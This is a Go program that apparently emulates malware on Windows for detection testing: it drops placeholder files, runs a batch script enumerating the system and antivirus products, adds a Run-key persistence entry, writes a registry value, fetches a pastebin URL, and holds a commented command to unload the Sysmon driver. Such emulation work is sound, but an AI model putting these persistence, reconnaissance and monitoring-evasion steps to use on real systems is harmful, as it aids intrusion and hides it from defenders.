package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os/exec"
	"sync"
	"time"

	"golang.org/x/sys/windows/registry"
)

var waitgroup sync.WaitGroup
var discoverycommands string = `
@ECHO OFF 
:: This batch file details Windows 10, hardware, and networking configuration.
TITLE My System Info
ECHO Please wait... Checking system information.
:: Section 1: Windows 10 information
ECHO ==========================
ECHO WINDOWS INFO
ECHO ============================
systeminfo | findstr /c:"OS Name"
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName,productState /format:list
systeminfo | findstr /c:"OS Version"

wmic cpu get name
wmic diskdrive get name,model,size

wmic path win32_videocontroller get name

wmic path win32_VideoController get CurrentHorizontalResolution,CurrentVerticalResolution

:: Section 3: Networking information.
ECHO ============================
ECHO NETWORK INFO
ECHO ============================
ipconfig | findstr IPv4
ipconfig | findstr IPv6
PAUSE
`

func writeFile(path string, data []byte) {

	err := ioutil.WriteFile(path, data, 0661)
	if err != nil {
		fmt.Println(err, path)
	}

}

func writeRegistry() {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Speech`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		log.Fatal(err)
	}
	if err := k.SetStringValue("cont", "malbytes"); err != nil {
		log.Fatal(err, " registry error")
	}
	if err := k.Close(); err != nil {
		log.Fatal(err)
	}
}
func runCommand(command string, parameters []string) {
	cmd := exec.Command(command, parameters...)

	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()

	if err != nil {
		log.Fatal(fmt.Sprint(err) + stderr.String() + ": " + command)
	}
}
func connect() []byte {

	resp, err := http.Get("https://pastebin.com/raw/CLpBY4QV")
	if err != nil {
		log.Fatal(err)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	return body

}
func main() {
	go connect()
	data := []byte(string("hramless malware related file "))
	writeFile("C:\\Users\\Public\\zf12.exe", data)
	data = []byte(string("dll+1"))
	writeFile("C:\\Windows\\Temp\\125975187254.dll", data)
	writeFile("C:\\Windows\\Temp\\ab.bat", []byte(discoverycommands))

	runPersistence := `REG.exe ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "harmlessmalware" /t REG_SZ /F /D "harmlessm.exe"`
	writeFile("C:\\Windows\\Temp\\a3h.bat", []byte(runPersistence))

	runCommand("cmd", []string{"/c", "C:\\Windows\\Temp\\a3h.bat"})
	runCommand("cmd", []string{"/C", "C:\\Windows\\Temp\\ab.bat"})
	//runCommand("cmd", []string{"/C", "fltMC", "unload", "SysmonDrv"})
	writeRegistry()

	time.Sleep(time.Second * 3)

}
